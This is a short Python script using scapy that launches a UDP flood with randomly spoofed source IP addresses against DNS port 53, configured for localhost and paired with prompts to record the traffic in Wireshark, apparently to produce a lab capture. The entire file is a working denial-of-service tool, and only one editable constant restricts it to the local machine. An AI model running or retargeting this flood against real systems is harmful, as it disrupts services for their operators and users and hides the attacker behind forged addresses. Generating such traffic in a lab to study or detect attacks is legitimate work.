from scapy.all import *
import random
import time
import threading
import sys

# CONFIGURATION - ONLY LOCALHOST!
TARGET_IP = "127.0.0.1"
TARGET_PORT = 53  # DNS port
DURATION = 20  # seconds
THREADS = 2    # Keep low

packets_sent = 0
running = True

def udp_flood_worker():
    global packets_sent
    while running:
        try:
            # Spoofed source IP
            src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
            # Random payload (100-500 bytes)
            payload = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=random.randint(100,500)))
            
            # Build UDP packet
            ip = IP(src=src_ip, dst=TARGET_IP)
            udp = UDP(sport=random.randint(1024,65535), dport=TARGET_PORT)
            data = Raw(load=payload)
            packet = ip/udp/data
            
            # Send
            send(packet, verbose=False)
            packets_sent += 1
            
            time.sleep(0.005)
        except:
            pass

print("="*60)
print("UDP FLOOD ATTACK - LOCALHOST ONLY")
print("="*60)
print(f"\nTarget: {TARGET_IP}:{TARGET_PORT}")
print(f"Duration: {DURATION} seconds")
input("\n[1] START WIRESHARK CAPTURE NOW (filter: udp.port == 53)")
input("[2] Press ENTER after Wireshark is capturing...")

print("\n[+] Starting UDP Flood...")
for _ in range(THREADS):
    thread = threading.Thread(target=udp_flood_worker)
    thread.start()

for i in range(DURATION):
    time.sleep(1)
    print(f"\r[*] Running: {i+1}s | Packets sent: {packets_sent}", end="")

running = False
print(f"\n\n[✓] COMPLETE! Total packets: {packets_sent}")
print("[✓] Average rate: {} packets/sec".format(packets_sent//DURATION))
input("\n[3] Press ENTER after saving Wireshark capture as 'udp_flood.pcap'")